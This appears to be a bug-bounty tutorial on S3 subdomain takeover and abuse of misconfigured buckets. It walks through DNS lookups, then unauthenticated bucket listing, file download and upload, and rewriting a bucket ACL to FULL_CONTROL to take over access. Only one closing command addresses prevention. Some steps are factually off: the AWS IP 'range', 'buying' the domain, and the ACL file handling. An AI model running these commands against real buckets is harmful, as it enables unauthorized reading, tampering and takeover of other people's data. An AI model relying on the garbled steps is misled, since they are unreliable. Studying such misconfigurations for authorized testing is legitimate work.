
# Cloud Domain Structure

The cloud domain looks something like this: `https://example.s3-website-us-west-2.amazonaws.com`
- **example** → Bucket name.
- **s3-website** → Proof that it is linked to the cloud (persistent).
- **us-west-2** → Region.
- **amazonaws.com** → The hosting cloud.

## Using `dig` Command to Identify CNAME

We use the `dig` command first to identify the CNAME of the subdomain so that if it doesn't exist, we can perform a Subdomain Takeover.

```bash
dig example.com
dig sub.example.com
dig CNAME sub.example.com   # To get bucket name from the subdomain.
```

### Extracting AWS CNAMEs from a File

If you have a file containing multiple links and want to extract only those with a CNAME associated with AWS, use the following command:

```bash
dig -f [filename] CNAME | grep aws   # Replace [filename] with the actual file name.
```

## What if you don't find the CNAME?

### Answer:
- Check the IPs that appeared. If they belong to the 50 range, like 52 or 54, then they are associated with Amazon AWS.
- Use the `nslookup` command to determine which bucket it is exactly linked to, or check here: [AWS IP Ranges](https://ip-ranges.amazonaws.com/ip-ranges.json)

```bash
nslookup <TargetIP>   # it might show you the CNAME but not the Bucket name, Go to Case (2).
```

## Two Possibilities

1. The domain isn't in use.
2. The domain is in use.

## Case (1): The Domain Isn't in Use

- If you find that the domain isn't in use, buy it and report the Subdomain Takeover vulnerability.

## Case (2): The Domain is in Use

- If you find that the domain is in use, try the following commands to interact with the server:

```bash
aws s3 ls s3://<Bucket_name> --region <Cloud_domain_region>   # Execute the ls command on the server.
```

- If you run `nslookup example.com`, and the Bucket name doesn't appear, use the main domain instead:

```bash
aws s3 ls s3://<Main_domain> --region <Cloud_domain_region>   # You can use --no-sign-request flag if you don't have AWS keys.
```

- After executing this command, if multiple files appear and you want to access one of them, append it to the bucket name (e.g., `s3://bucket_name/file`).

## Vulnerability Name: S3-Bucket-Listing

### Downloading a File from the Server

If you want to download a copy of a file from the server to your device, use:

```bash
aws s3 cp s3://Bucket_name/filename /your/path   # From the server to your device.
```

- Replace `Bucket_name` with the actual bucket name and `filename` with the file you want to download, `/your/path` with the directory where you want to download the file.

### Uploading a File to the Server

If you want to upload a file from your device to the server:

```bash
aws s3 cp /your/path/filename s3://Bucket_name/   # From your device to the server.
```

- Replace `/your/path/filename` with the file you want to upload and `Bucket_name` with the actual bucket name.

### Checking Bucket Permissions

To check the permissions of a specific bucket:

```bash
aws s3api get-bucket-acl --bucket <Bucket_name>
```

This will display the authorized users (Grantees) who have permissions on the S3 bucket and their permission types (e.g., READ, WRITE, FULL_CONTROL).

### Modifying Bucket Permissions

By default, the file is named `acl.json`, so we will download it to our device and modify `WRITE_ACP` to `FULL_CONTROL` to gain access to the server:

```bash
aws s3api get-bucket-acl --bucket <Bucket_name> >> acl.json   # Download from the server.
aws s3api put-bucket-acl --bucket <Bucket_name> --access-control-policy file://acl.json   # Upload to the server.
```

### See Active Buckets Worldwide

To see all active buckets right now, visit: [Gray Hat Warfare Buckets](https://buckets.grayhatwarfare.com)

## How to Prevent an S3 Bucket from Being Public?

To block public access:

```bash
aws s3api put-public-access-block --bucket <BUCKET_NAME> --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```
